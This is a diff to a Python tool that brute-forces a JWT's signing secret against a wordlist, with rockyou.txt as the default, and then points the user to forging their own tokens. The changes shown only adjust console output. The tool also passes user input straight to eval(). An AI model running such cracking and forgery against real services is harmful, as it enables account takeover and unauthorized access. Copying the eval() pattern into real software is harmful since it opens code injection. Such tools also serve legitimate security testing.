@@ -36,18 +36,18 @@ def forge(data, secret, alg):
 def brute(word, variable, alg, token):
         variable = eval(variable)
         global i
+        global right
         i = i + 1
-        print(colored(f"Trying: {word}", "red"))
+        print(colored(f"Trying: {word}", "red"), end="\r")
         new_jwt = jwt.encode(variable, key=word, algorithm=alg)
         new_jwt = new_jwt.decode("UTF-8")
         if token == new_jwt:
-            print(colored(f"[+] Correct Secret Key Found!: {word}", "green"))
+            right = "1"
             end = time.time()
             timer = end - time1
-            print(f"[+] Tried: {i} Passwords in: {timer} Seconds\n")
-            global right
-            right = "1"
-            print(colored("Now use -f in the script to create\nYour own forged JWT token!\n\n", "blue"))
+            print(colored(f"\n\n[+] Correct Secret Key Found!: {word}", "green"))
+            print(f"\n[+] Tried: {i} Passwords in: {timer} Seconds\n")
+            print(colored("Now use -f in the script to create\nYour own forged JWT token!\n", "blue"))
 
 
 def send_to_brute(wordlist, variable, alg, token):
@@ -89,6 +89,7 @@ def decode_jwt(token):
         if choice == "y":
             print("\nNOTE: just press enter to use rockyou.txt")
             wordl = input(colored("[+] Enter wordlist FULL PATH(!) - > ", "blue"))
+            print("---------------------------------------------")
             if wordl == "":
                 wordl = "/usr/share/wordlists/rockyou.txt"
             alg = re.search('(?:"alg":")(.*)(?:")', decoded1)
